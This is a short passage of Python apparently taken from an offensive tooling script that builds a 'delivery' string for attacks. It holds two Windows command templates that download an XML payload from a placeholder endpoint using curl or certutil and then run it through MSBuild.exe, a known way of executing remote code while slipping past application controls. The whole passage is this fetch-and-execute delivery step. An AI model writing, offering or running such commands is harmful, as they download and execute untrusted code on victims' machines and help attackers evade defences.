...
delivery = f'curl ~endpoint~ -o {artifact}.xml && C:\Windows\Microsoft.NET\Framework64\\v4.0.30319\MSBuild.exe {artifact}.xml\n' \
           f'certutil -urlcache -split -f ~endpoint~ {artifact}.xml && C:\Windows\Microsoft.NET\Framework64\\v4.0.30319\MSBuild.exe {artifact}.xml'
